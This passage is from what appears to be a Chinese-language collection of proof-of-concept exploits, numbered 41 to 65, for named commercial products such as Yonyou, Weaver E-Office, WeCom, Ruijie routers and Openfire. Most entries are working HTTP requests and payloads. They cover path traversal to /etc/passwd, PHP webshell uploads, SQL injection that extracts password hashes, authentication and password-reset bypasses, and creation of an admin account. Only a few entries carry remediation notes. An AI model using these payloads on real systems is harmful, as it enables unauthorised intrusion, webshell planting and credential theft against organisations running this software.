6688chksm=eb3834e5dc4fbdf3a9529734de7e6958e1b7efabecd1c1b340c53c80299ff5c688b
f6adaed61&scene=2

41、Milesight VPN server.js 任意文件读取漏洞

POC:
GET /../etc/passwd HTTP/1.1
Host:
Accept: /
Content-Type: application/x-www-form-urlencoded

42、PigCMS action_flashUpload 任意文件上传漏洞

POC:
POST /cms/manage/admin.php?m=manage&c=background&a=action_flashUpload
HTTP/1.1
Host:
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----aaa
------aaa
Content-Disposition: form-data; name="filePath"; filename="test.php"
Content-Type: video/x-flv
<?php phpinfo();?>
------aaa
/cms/upload/images/2023/08/11/1691722887xXbx.php

43、绿盟 NF 下一代防火墙 任意文件上传漏洞

POC:
POST /api/v1/device/bugsInfo HTTP/1.1
Content-Type: multipart/form-data; boundary=4803b59d015026999b45993b1245f0ef
Host:
--4803b59d015026999b45993b1245f0ef
Content-Disposition: form-data; name="file"; filename="compose.php"
<?php eval($_POST['cmd']);?>
--4803b59d015026999b45993b1245f0ef--
POST /mail/include/header_main.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID_NF=82c13f359d0dd8f51c29d658a9c8ac71
Host:
cmd=phpinfo();

44、金盘 微信管理平台 getsysteminfo 未授权访问漏洞

POC:
/admin/weichatcfg/getsysteminfo
45、Panel loadfile 后台文件读取漏洞

POC:
POST /api/v1/file/loadfile
{"paht":"/etc/passwd"}

46、网御 ACM 上网行为管理系统bottomframe.cgi SQL 注入漏洞

POC:
/bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23

47、广联达 Linkworks GetIMDictionarySQL 注入漏洞

POC:
POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --

48、用友文件服务器认证绕过

资产搜索：
app="用友-NC-Cloud"   或者是app="用友-NC-Cloud" && server=="Apache-Coyote/1.1"

POST数据包修改返回包 false改成ture就可以绕过登陆

HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Date: Thu, 10 Aug 2023 20:38:25 GMT
Connection: close
Content-Length: 17

{"login":"false"}

49、华天动力oa SQL注入

访问
http://xxxx//report/reportJsp/showReport.jsp?raq=%2FJourTemp2.raq&reportParamsId=100xxx

然后抓包
POST /report/reportServlet?action=8 HTTP/1.1
Host: xxxx
Content-Length: 145
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://xxx/
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://xxxx/report/reportJsp/showReport.jsp?raq=%2FJourTemp2.raq&reportParamsId=100xxx
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=D207AE96056400942620F09D34B8CDF3
Connection: close

year=*&userName=*&startDate=*&endDate=*&dutyRule=*&resultPage=%2FreportJsp%2FshowRepo

48、49漏洞来源于：https://mp.weixin.qq.com/s/hUig93-cSFtbioQpPSNZig
50、泛微 Weaver E-Office9 前台文件包含

http://URL/E-mobile/App/Init.php?weiApi=1&sessionkey=ee651bec023d0db0c233fcb562ec7673_admin&m=12344554_../../attachment/xxx.xls

（网友ZEROS贡献）
51、企业微信（私有化版本）敏感信息泄露漏洞

紧急通知，长亭报出企业微信存在信息泄露0day！目前已在准备预警，请注意！
企业微信URL/cgi-bin/gateway/agentinfo
接口未授权情况下可直接获取企业微信secret等敏感信息
受影响版本：2.5.x、2.6.930000、以下；
不受影响：2.7.x、2.8.x、2.9.x；

危害：
1、可导致企业微信全量数据被获取、文件获取，
2、存在使用企业微信轻应用对内发送钓鱼文件和链接等风险。

修复方法：
1、在waf上设置一个规则，匹配到/cgi-bin/gateway/agentinfo路径的进行阻断；
2、联系厂家进行获取修复包；
3、官方通报及补丁地址
[图片]

复现及漏洞详情分析：
第一步：，通过泄露信息接口可以获取corpid和corpsecret
https://<企业微信域名>/cgi-bin/gateway/agentinfo

第二步，使用corpsecret和corpid获得token
https://<企业微信域名>/cgi-bin/gettoken?corpid=ID&corpsecret=SECRET

第三步，使用token访问诸如企业通讯录信息，修改用户密码，发送消息，云盘等接口
https://<企业微信域名>/cgi-bin/user/get?access_token=ACCESS_TOKEN&userid=USERID
[图片]
[图片]

52、帆软报表系统漏洞威胁

情况说明：帆软报表系统（V10、V11及更早期版本）存在反序列化漏洞绕过、反序列化命令执行等高危漏洞，攻击者可利用上述漏洞获取系统权限。鉴于该漏洞影响范围较大，潜在危害程度极高，建议引起高度重视，通过官方发布的链接下载补丁，进行升级，消除安全隐患，提高安全防范能力。
漏洞详细信息: https://help.fanruan.com/finereport/doc-view-4833.html
补丁下载链接: http: //s.fanruan.com/3u6eo

53、蓝凌EKP远程代码执行漏洞

受影响版本：
   蓝凌EKP V16 (最新版)受影响存在远程代码执行漏洞；V15暂无环境验证，可能受影响。
修复方案：
   使用网络ACL限制该OA的访问来源，加强监测，重点拦截GET请求中带有../等目录穿越特征的URL。

54、Smartx超融合远程命令执行漏洞

受影响版本：Smartx超融合version <= 5.0.5受影响存在漏洞；最新版暂无环境验证，可能受影响。
修复方案：使用网络ACL限制该产品的访问来源，加强监测，重点拦截GET请求中带有操作系统命令注入特征的URL。

55、Nacos-Sync未授权漏洞

https://xxx.xxx.xxx/#/serviceSync

56、360 新天擎终端安全管理系统信息泄露漏洞

http://ip:port/runtime/admin_log_conf.cache

57、锐捷 NBR 路由器 fileupload.php 任意文件上传漏洞

POST /ddi/server/fileupload.php?uploadDir=../../321&name=123.php HTTP/1.1
Host: 
Accept: text/plain, */*; q=0.01
Content-Disposition: form-data; name="file"; filename="111.php"
Content-Type: image/jpeg

<?php phpinfo();?>

58、网神 SecSSL 3600安全接入网关系统 任意密码修改漏洞

POST /changepass.php?type=2 

Cookie: admin_id=1; gw_user_ticket=ffffffffffffffffffffffffffffffff; last_step_param={"this_name":"test","subAuthId":"1"}
old_pass=&password=Test123!@&repassword=Test123!@

59、Openfire身份认证绕过漏洞(CVE-2023-32315)

GET /user-create.jsp?csrf=Sio3WOA89y2L9Rl&username=user1&name=&email=&password=Qwer1234&passwordConfirm=Qwer1234&isadmin=on&create=............ HTTP/1.1

59、大华智慧园区任意密码读取攻击

GET /admin/user_getUserInfoByUserName.action?userName=system HTTP/1.1

60、泛微 ShowDocsImagesql注入漏洞

GET
/weaver/weaver.docs.docs.ShowDocsImageServlet?docId=* HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,
like Gecko) 5bGx5rW35LmL5YWz
Accept-Encoding: gzip, deflate
Connection: close

61、宏景 HCM codesettree SQL 注入漏洞

GET
/servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20al
l~20select~20~27~31~27~2cusername~20from~20operuser~20~2d~2d HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,
like Gecko) 5bGx5rW35LmL5YWz
Accept-Encoding: gzip, deflate
Connection: close

61、用友时空 KSOATaskRequestServlet sql注入漏洞

/servlet/com.sksoft.v8.trans.servlet.TaskRequestServlet?unitid=1*&password=1,

62、用友时空 KSOA servletimagefield 文件 sKeyvalue 参数SQL 注入
```
GET
/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))-
-+ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,
like Gecko) 5bGx5rW35LmL5YWz
Accept-Encoding: gzip, deflate
Connection:
63、用友畅捷通 T注入
sqlmap -u http://xx.xx.xx.xx/WebSer~1/create_site.php?site_id=1 --is-dba
64、宏景OA文件上传
POST /w_selfservice/oauthservlet/%2e./.%2e/system/options/customreport/OfficeServer.jsp HTTP/1.1
Host: xx.xx.xx.xx
Cookie: JSESSIONID=C92F3ED039AAF958516349D0ADEE426E
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 417

DBSTEP V3.0     351             0               666             DBSTEP=REJTVEVQ
OPTION=U0FWRUZJTEU=
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
FILETYPE=Li5cMW5kZXguanNw
RECOR1DID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
originalFileId=wV66
originalCreateDate=wUghPB3szB3Xwg66
FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
needReadFile=yRWZdAS6
originalCreateDate=wLSGP4oEzLKAz4=iz=66

1

shell:http://xx.xx.xx.xx/1ndex.jsp
```
65、金和OA 未授权
```
1.漏洞链接
http://xx.xx.xx.xx/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1
2.复现步骤
http://xx.xx.xx.xx/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1%3bWAITFOR+DELAY+'0%3a0%3a5'+--%20and%201=1
```
